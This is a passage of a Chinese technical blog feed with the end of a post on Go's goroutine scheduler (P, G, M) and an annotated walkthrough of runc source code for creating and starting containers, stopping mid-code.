    <content type="html"><![CDATA[<h2 id="go协程调度机制"><a href="#go协程调度机制" class="headerlink" title="go协程调度机制"></a>go协程调度机制</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><h3 id=""><a href="#" class="headerlink" title=""></a><img src="/images/image-20200615092403012.png" alt="image-20200615092403012"></h3><p>Processor（简称 P）  </p><p>goroutine（简称 G）  </p><p>系统线程（简称 M）  </p><p>⾸先是 Processor（简称 P），其作⽤类似 CPU 核，⽤来控制可同时并发执⾏的任务数量。每个⼯作线程都必须绑定⼀个有效 P 才被允许执⾏任务，否则只能休眠，直到有空闲 P 时被唤醒。P 还为线程提供执⾏资源，⽐如对象分配内存、本地任务队列等。线程独享所绑定的 P 资源，可在⽆锁状态下执⾏⾼效操作。<br>基本上，进程内的⼀切都在以 goroutine（简称 G）⽅式运⾏，包括运⾏时相关服务，以及main.main ⼊⼜函数。需要指出，G 并⾮执⾏体，它仅仅保存并发任务状态，为任务执⾏提供所需栈内存空间。G 任务创建后被放置在 P 本地队列或全局队列，等待⼯作线程调度<br>执⾏。  </p><p>实际执⾏体是系统线程（简称 M），它和 P 绑定，以调度循环⽅式不停执⾏ G 并发任务。M 通过修改寄存器，将执⾏栈指向 G ⾃带栈内存，并在此空间内分配堆栈帧，执⾏任务函数。当需要中途切换时，只要将相关寄存器值保存回 G 空间即可维持状态，任何 M 都可据此恢复执⾏。线程仅负责执⾏，不再持有状态，这是并发任务跨线程调度，实现多路复⽤的根本所在。</p><p>尽管 P/M 构成执⾏组合体，但两者数量并⾮⼀⼀对应。通常情况下，P 数量相对恒定，默认与 CPU 核数量相同，但也可能更多或更少，⽽ M 则是调度器按需创建。举例来说，当M 因陷⼊系统调⽤⽽长时间阻塞时，P 就会被监控线程抢回，去新建（或唤醒）⼀个 M 执⾏其他任务，如此 M 的数量就会增长。</p><p>因为 G 初始栈仅有 2KB，且创建操作只是在⽤户空间简单的对象分配，远⽐进⼊内核态分配线程要简单得多。调度器让多个 M 进⼊调度循环，不停获取并执⾏任务，所以我们才能创建成千上万个并发任务  </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;go协程调度机制&quot;&gt;&lt;a href=&quot;#go协程调度机制&quot; class=&quot;headerlink&quot; title=&quot;go协程调度机制&quot;&gt;&lt;/a&gt;go协程调度机制&lt;/h2&gt;&lt;h3 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
    
      <category term="golang" scheme="http://www.yorzorzy.xyz/categories/golang/"/>
    
    
      <category term="golang" scheme="http://www.yorzorzy.xyz/tags/golang/"/>
    
  </entry>
  
  <entry>
    <title>runc原理学习</title>
    <link href="http://www.yorzorzy.xyz/2020/03/31/runc%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/"/>
    <id>http://www.yorzorzy.xyz/2020/03/31/runc%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-03-31T03:52:51.552Z</published>
    <updated>2020-03-31T03:02:36.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="runc原理学习"><a href="#runc原理学习" class="headerlink" title="runc原理学习"></a>runc原理学习</h2><h3 id="1-代码结构"><a href="#1-代码结构" class="headerlink" title="1. 代码结构"></a>1. 代码结构</h3><p><img src="https://img-blog.csdnimg.cn/20190302170732673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NoZW5tbzE4N0ozWDE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="2-原理分析"><a href="#2-原理分析" class="headerlink" title="2. 原理分析"></a>2. 原理分析</h3><p>从create -&gt; start -&gt; run-&gt; stop来分析：</p><p><img src="http://www.sel.zju.edu.cn/wp-content/uploads/2018/08/runc.png" alt="runc"></p><p>createCommand代码入口：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Action: <span class="function"><span class="keyword">func</span><span class="params">(context *cli.Context)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">spec, err := setupSpec(context)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">status, err := startContainer(context, spec, <span class="literal">true</span>)  <span class="comment">// 开启容器</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// exit with the container's exit status so any external supervisor is</span></span><br><span class="line"><span class="comment">// notified of the exit with the correct exit status.</span></span><br><span class="line">os.Exit(status)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>startContainter:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">startContainer</span><span class="params">(context *cli.Context, spec *specs.Spec, create <span class="keyword">bool</span>)</span> <span class="params">(<span class="keyword">int</span>, error)</span></span> &#123;</span><br><span class="line">id := context.Args().First()</span><br><span class="line"><span class="keyword">if</span> id == <span class="string">""</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>, errEmptyID</span><br><span class="line">&#125;</span><br><span class="line">container, err := createContainer(context, id, spec)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>, err</span><br><span class="line">&#125;</span><br><span class="line">detach := context.Bool(<span class="string">"detach"</span>)</span><br><span class="line"><span class="comment">// Support on-demand socket activation by passing file descriptors into the container init process.</span></span><br><span class="line">listenFDs := []*os.File&#123;&#125;</span><br><span class="line"><span class="keyword">if</span> os.Getenv(<span class="string">"LISTEN_FDS"</span>) != <span class="string">""</span> &#123;</span><br><span class="line">listenFDs = activation.Files(<span class="literal">false</span>)</span><br><span class="line">&#125;</span><br><span class="line">r := &amp;runner&#123;</span><br><span class="line">enableSubreaper: !context.Bool(<span class="string">"no-subreaper"</span>),</span><br><span class="line">shouldDestroy:   <span class="literal">true</span>,</span><br><span class="line">container:       container,</span><br><span class="line">listenFDs:       listenFDs,</span><br><span class="line">console:         context.String(<span class="string">"console"</span>),</span><br><span class="line">detach:          detach,</span><br><span class="line">pidFile:         context.String(<span class="string">"pid-file"</span>),</span><br><span class="line">create:          create,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> r.run(&amp;spec.Process)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用函数createContainer，然后返回初始化之后的runner结构体。</p><p>createContainer函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">createContainer</span><span class="params">(context *cli.Context, id <span class="keyword">string</span>, spec *specs.Spec)</span> <span class="params">(libcontainer.Container, error)</span></span> &#123;</span><br><span class="line">config, err := specconv.CreateLibcontainerConfig(&amp;specconv.CreateOpts&#123;</span><br><span class="line">CgroupName:       id,</span><br><span class="line">UseSystemdCgroup: context.GlobalBool(<span class="string">"systemd-cgroup"</span>),</span><br><span class="line">NoPivotRoot:      context.Bool(<span class="string">"no-pivot"</span>),</span><br><span class="line">NoNewKeyring:     context.Bool(<span class="string">"no-new-keyring"</span>),</span><br><span class="line">Spec:             spec,</span><br><span class="line">&#125;)</span><br><span class="line">    <span class="comment">//读取配置文件</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 查看rootfs的状态</span></span><br><span class="line"><span class="keyword">if</span> _, err := os.Stat(config.Rootfs); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> os.IsNotExist(err) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">"rootfs (%q) does not exist"</span>, config.Rootfs)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//加载factory</span></span><br><span class="line">factory, err := loadFactory(context)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//创建factory</span></span><br><span class="line"><span class="keyword">return</span> factory.Create(id, config)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>loadFactory(context)函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// loadFactory returns the configured factory instance for execing containers.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">loadFactory</span><span class="params">(context *cli.Context)</span> <span class="params">(libcontainer.Factory, error)</span></span> &#123;</span><br><span class="line">root := context.GlobalString(<span class="string">"root"</span>)</span><br><span class="line">abs, err := filepath.Abs(root)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">cgroupManager := libcontainer.Cgroupfs  <span class="comment">// 获取cgroupfs对象</span></span><br><span class="line"><span class="keyword">if</span> context.GlobalBool(<span class="string">"systemd-cgroup"</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> systemd.UseSystemd() &#123;</span><br><span class="line">cgroupManager = libcontainer.SystemdCgroups</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">"systemd cgroup flag passed, but systemd support for managing cgroups is not available"</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> libcontainer.New(abs, cgroupManager, libcontainer.CriuPath(context.GlobalString(<span class="string">"criu"</span>)))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>New函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// New returns a linux based container factory based in the root directory and</span></span><br><span class="line"><span class="comment">// configures the factory with the provided option funcs.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">New</span><span class="params">(root <span class="keyword">string</span>, options ...<span class="keyword">func</span>(*LinuxFactory)</span> <span class="title">error</span>) <span class="params">(Factory, error)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> root != <span class="string">""</span> &#123;</span><br><span class="line">        <span class="comment">//设置权限</span></span><br><span class="line"><span class="keyword">if</span> err := os.MkdirAll(root, <span class="number">0700</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, newGenericError(err, SystemError)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//返回一个自身进程</span></span><br><span class="line">l := &amp;LinuxFactory&#123;</span><br><span class="line">Root:      root,</span><br><span class="line">InitArgs:  []<span class="keyword">string</span>&#123;<span class="string">"/proc/self/exe"</span>, <span class="string">"init"</span>&#125;,</span><br><span class="line">Validator: validate.New(),</span><br><span class="line">CriuPath:  <span class="string">"criu"</span>,</span><br><span class="line">&#125;</span><br><span class="line">Cgroupfs(l)</span><br><span class="line"><span class="keyword">for</span> _, opt := <span class="keyword">range</span> options &#123;</span><br><span class="line"><span class="keyword">if</span> err := opt(l); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> l, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Cgroupfs函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Cgroupfs is an options func to configure a LinuxFactory to return</span></span><br><span class="line"><span class="comment">// containers that use the native cgroups filesystem implementation to</span></span><br><span class="line"><span class="comment">// create and manage cgroups.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Cgroupfs</span><span class="params">(l *LinuxFactory)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">    <span class="comment">//返回一个cgroups对象</span></span><br><span class="line">l.NewCgroupsManager = <span class="function"><span class="keyword">func</span><span class="params">(config *configs.Cgroup, paths <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>)</span> <span class="title">cgroups</span>.<span class="title">Manager</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> &amp;fs.Manager&#123;</span><br><span class="line">Cgroups: config,</span><br><span class="line">Paths:   paths,</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>create函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *LinuxFactory)</span> <span class="title">Create</span><span class="params">(id <span class="keyword">string</span>, config *configs.Config)</span> <span class="params">(Container, error)</span></span> &#123;</span><br><span class="line">    <span class="comment">// root为空返回</span></span><br><span class="line">   <span class="keyword">if</span> l.Root == <span class="string">""</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, newGenericError(fmt.Errorf(<span class="string">"invalid root"</span>), ConfigInvalid)</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="comment">// 验证id</span></span><br><span class="line">   <span class="keyword">if</span> err := l.validateID(id); err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="comment">//验证是否路径正常</span></span><br><span class="line">   <span class="keyword">if</span> err := l.Validator.Validate(config); err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, newGenericError(err, ConfigInvalid)</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//获取host uid</span></span><br><span class="line">   uid, err := config.HostUID()</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, newGenericError(err, SystemError)</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="comment">// 获取gid</span></span><br><span class="line">   gid, err := config.HostGID()</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, newGenericError(err, SystemError)</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="comment">//容器的路径</span></span><br><span class="line">   containerRoot := filepath.Join(l.Root, id)</span><br><span class="line">    <span class="comment">//如果已经在使用，报错</span></span><br><span class="line">   <span class="keyword">if</span> _, err := os.Stat(containerRoot); err == <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, newGenericError(fmt.Errorf(<span class="string">"container with id exists: %v"</span>, id), IdInUse)</span><br><span class="line">   &#125; <span class="keyword">else</span> <span class="keyword">if</span> !os.IsNotExist(err) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, newGenericError(err, SystemError)</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="comment">//设置权限</span></span><br><span class="line">   <span class="keyword">if</span> err := os.MkdirAll(containerRoot, <span class="number">0711</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, newGenericError(err, SystemError)</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="comment">//赋权</span></span><br><span class="line">   <span class="keyword">if</span> err := os.Chown(containerRoot, uid, gid); err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, newGenericError(err, SystemError)</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="comment">//fifo路径</span></span><br><span class="line">   fifoName := filepath.Join(containerRoot, execFifoFilename)</span><br><span class="line">   oldMask := syscall.Umask(<span class="number">0000</span>)</span><br><span class="line">   <span class="keyword">if</span> err := syscall.Mkfifo(fifoName, <span class="number">0622</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">      syscall.Umask(oldMask)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, newGenericError(err, SystemError)</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="comment">//umask</span></span><br><span class="line">   syscall.Umask(oldMask)</span><br><span class="line">   <span class="keyword">if</span> err := os.Chown(fifoName, uid, gid); err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, newGenericError(err, SystemError)</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="comment">//返回容器对象</span></span><br><span class="line">   c := &amp;linuxContainer&#123;</span><br><span class="line">      id:            id,</span><br><span class="line">      root:          containerRoot,</span><br><span class="line">      config:        config,</span><br><span class="line">      initArgs:      l.InitArgs,</span><br><span class="line">      criuPath:      l.CriuPath,</span><br><span class="line">      cgroupManager: l.NewCgroupsManager(config.Cgroups, <span class="literal">nil</span>),</span><br><span class="line">   &#125;</span><br><span class="line">   c.state = &amp;stoppedState&#123;c: c&#125;</span><br><span class="line">   <span class="keyword">return</span> c, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>run函数执行启动：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *runner)</span> <span class="title">run</span><span class="params">(config *specs.Process)</span> <span class="params">(<span class="keyword">int</span>, error)</span></span> &#123;</span><br><span class="line">process, err := newProcess(*config)  <span class="comment">//创建新的process,返回一个新的libcontainer process</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">r.destroy()</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(r.listenFDs) &gt; <span class="number">0</span> &#123;</span><br><span class="line">process.Env = <span class="built_in">append</span>(process.Env, fmt.Sprintf(<span class="string">"LISTEN_FDS=%d"</span>, <span class="built_in">len</span>(r.listenFDs)), <span class="string">"LISTEN_PID=1"</span>)</span><br><span class="line">process.ExtraFiles = <span class="built_in">append</span>(process.ExtraFiles, r.listenFDs...)</span><br><span class="line">&#125;</span><br><span class="line">rootuid, err := r.container.Config().HostUID()  <span class="comment">//获取host uid</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">r.destroy()</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>, err</span><br><span class="line">&#125;</span><br><span class="line">rootgid, err := r.container.Config().HostGID()  <span class="comment">//获取host gid</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">r.destroy()</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>, err</span><br><span class="line">&#125;</span><br><span class="line">tty, err := setupIO(process, rootuid, rootgid, r.console, config.Terminal, r.detach || r.create)  <span class="comment">// 设置io</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">r.destroy()</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>, err</span><br><span class="line">&#125;</span><br><span class="line">handler := newSignalHandler(tty, r.enableSubreaper) <span class="comment">// 信号处理函数</span></span><br><span class="line">startFn := r.container.Start  <span class="comment">//启动函数</span></span><br><span class="line"><span class="keyword">if</span> !r.create &#123;</span><br><span class="line">startFn = r.container.Run</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> tty.Close()</span><br><span class="line"><span class="keyword">if</span> err := startFn(process); err != <span class="literal">nil</span> &#123; <span class="comment">//启动进程</span></span><br><span class="line">r.destroy()</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := tty.ClosePostStart(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">r.terminate(process)</span><br><span class="line">r.destroy()</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> r.pidFile != <span class="string">""</span> &#123;  <span class="comment">//创建pid文件</span></span><br><span class="line"><span class="keyword">if</span> err := createPidFile(r.pidFile, process); err != <span class="literal">nil</span> &#123;</span><br><span class="line">r.terminate(process)</span><br><span class="line">r.destroy()</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>, err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> r.detach || r.create &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">status, err := handler.forward(process) <span class="comment">//等待信息</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">r.terminate(process)</span><br><span class="line">&#125;</span><br><span class="line">r.destroy()</span><br><span class="line"><span class="keyword">return</span> status, err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这边启动函数为：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *linuxContainer)</span> <span class="title">Start</span><span class="params">(process *Process)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">   c.m.Lock()</span><br><span class="line">   <span class="keyword">defer</span> c.m.Unlock()</span><br><span class="line">   status, err := c.currentStatus() <span class="comment">//获取当前状态</span></span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> err</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> c.start(process, status == Stopped)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>start函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *linuxContainer)</span> <span class="title">start</span><span class="params">(process *Process, isInit <span class="keyword">bool</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">parent, err := c.newParentProcess(process, isInit) <span class="comment">//创建newParentProcess进程，</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> newSystemErrorWithCause(err, <span class="string">"creating new parent process"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := parent.start(); err != <span class="literal">nil</span> &#123; <span class="comment">//start</span></span><br><span class="line"><span class="comment">// terminate the process to ensure that it properly is reaped.</span></span><br><span class="line"><span class="keyword">if</span> err := parent.terminate(); err != <span class="literal">nil</span> 